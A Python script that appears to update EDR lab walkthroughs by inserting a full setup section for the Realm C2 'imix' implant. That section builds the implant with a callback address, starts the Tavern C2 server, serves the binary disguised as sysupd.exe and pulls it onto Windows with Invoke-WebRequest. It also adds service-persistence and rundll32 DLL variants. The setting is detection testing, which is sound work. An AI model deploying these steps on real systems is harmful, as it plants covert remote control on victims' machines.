"""Insert the full Realm C2 implant-setup section into every walkthrough.

Replaces each walkthrough's short '**Kali:** follow _common...' pointer with the
complete creation -> serve -> pull-onto-Windows flow, so each test is
self-sufficient. dll-sideload already carries the full Part 1 and is skipped.
"""
import re, os, sys

ROOT = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                    "custom-walkthrough")
KALI = "172.16.69.109"

# per-directory build variant lines (inserted into step b after the base build)
VARIANTS = {
    "execution-rundll32-dll": (
        "cargo build --release --lib                      # DLL build for this test\n"
        "cp target/release/imix.dll ~/sideload-lab/"),
    "persistence-service": (
        "IMIX_CALLBACK_URI=http://" + KALI + ":8080 cargo build --release --features win_service\n"
        "cp target/release/imix.exe ~/sideload-lab/imix_svc.exe"),
}
EXTRA_PULL = {
    "execution-rundll32-dll":
        "Invoke-WebRequest http://" + KALI + ":8000/imix.dll -OutFile C:\\Users\\Public\\imix.dll",
    "persistence-service":
        "Invoke-WebRequest http://" + KALI + ":8000/imix_svc.exe -OutFile C:\\Users\\Public\\imix_svc.exe",
}

SECTION = """**Implant setup — creation to the Windows machine (do once before the test):**

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build the implant (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: build with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://{kali}:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
{variant}```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant on the machine + prep the EDR** (elevated PowerShell):
```powershell
Invoke-WebRequest http://{kali}:8000/sysupd.exe -OutFile C:\\Users\\Public\\sysupd.exe
{extra_pull}# EDR running + fresh persistence baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```
These drops themselves should already fire `SIG-REALM-IMIX` / `SIG-RUST-IMPLANT`
(on-write scan) — delivery detection working before the test even starts.
Full reference: [`../_common/implant-build.md`](../_common/implant-build.md).
"""

OPTIONAL_NOTE = """**Implant setup (optional for this test):** this walkthrough is fully self-contained
and needs no Kali box. To run it with the real Realm C2 implant instead, follow
steps a-d in [`../_common/implant-build.md`](../_common/implant-build.md)
(clone Realm, `IMIX_CALLBACK_URI=http://{kali}:8080 cargo build --release`,
serve, pull `sysupd.exe` to `C:\\Users\\Public\\`) and point the test at that binary.
"""

def build_section(dirname):
    var = VARIANTS.get(dirname)
    variant_block = (var + "\n") if var else ""
    extra = EXTRA_PULL.get(dirname, "")
    extra_block = (extra + "\n") if extra else ""
    return SECTION.format(kali=KALI, variant=variant_block, extra_pull=extra_block)

def main():
    changed = []
    for d in sorted(os.listdir(ROOT)):
        full = os.path.join(ROOT, d, "WALKTHROUGH.md")
        if not os.path.isfile(full) or d == "dll-sideload":
            continue
        s = open(full, encoding="utf-8").read()
        if "Implant setup — creation to the Windows machine" in s:
            continue                      # already expanded
        # replace the short Kali pointer line (+ its trailing sentence) with the full section
        # (lambda repl: the section contains backslashes, must not be parsed as escapes)
        new = re.sub(r"^\*\*Kali:\*\*.*$", lambda m: build_section(d), s, count=1, flags=re.M)
        if new == s:
            # no Kali pointer (self-contained tests) -> insert optional note after intro
            new = s.replace("**Chain:**", OPTIONAL_NOTE.format(kali=KALI) + "\n**Chain:**", 1)
        if new != s:
            open(full, "w", encoding="utf-8").write(new)
            changed.append(d)
    print("updated:", len(changed))
    for c in changed:
        print(" -", c)

if __name__ == "__main__":
    main()
